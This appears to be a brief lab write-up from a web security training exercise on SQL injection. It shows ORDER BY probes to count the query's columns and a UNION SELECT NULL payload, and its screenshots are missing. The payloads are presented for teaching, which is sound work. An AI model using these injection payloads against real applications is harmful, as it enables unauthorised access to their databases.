## Lab Description :

![image]()


## Solution :

![image]()

Query made - 

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>'
```

We craft the request by adding **UNION** along with **ORDER BY** clause to *find the number of columns that is being used by the query*.

**ORDER BY 1**

```SQL
SELECT * FROM someTable WHERE category = '<CATEGORY>' ORDER BY 1 --
```

![image]()

**ORDER BY 2**

![image]()

**ORDER BY 3**

![image]()

**ORDER BY 4**

![image]()

This throws an error. It means that there are 3 columns that is being retreived in the query by the web application.

Now as per our given question, we use **UNION SELECT NULL** payload to return an additional column that contains null values.

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,NULL,NULL --
```

![image]()



